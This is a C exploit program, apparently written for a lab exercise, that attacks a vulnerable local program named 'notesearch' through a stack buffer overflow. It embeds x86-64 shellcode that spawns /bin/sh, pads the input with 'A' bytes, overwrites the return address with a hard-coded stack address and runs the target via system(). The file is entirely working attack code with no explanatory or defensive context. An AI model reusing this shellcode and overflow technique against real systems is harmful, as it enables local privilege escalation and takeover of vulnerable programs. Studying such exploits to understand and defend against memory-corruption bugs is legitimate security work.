#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f"
"\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05";

int main(int argc, char *argv[]) {
    char *command, *code, *buffer, *ret_addr;
    char addr[] = "\x30\xdf\xff\xff\xff\x7f";

    command = (char *)malloc(142);
    bzero(command, 142);

    strcpy(command, "./notesearch \'");

    code = command + strlen(command);
    memcpy(code, shellcode, strlen(shellcode));

    buffer = code + strlen(code);
    memset(buffer, 0x41, 91);

    ret_addr = buffer + strlen(buffer);

    memcpy(ret_addr, addr, strlen(addr));

    strcat(command, "\'");
    system(command);
    free(command);
    
}
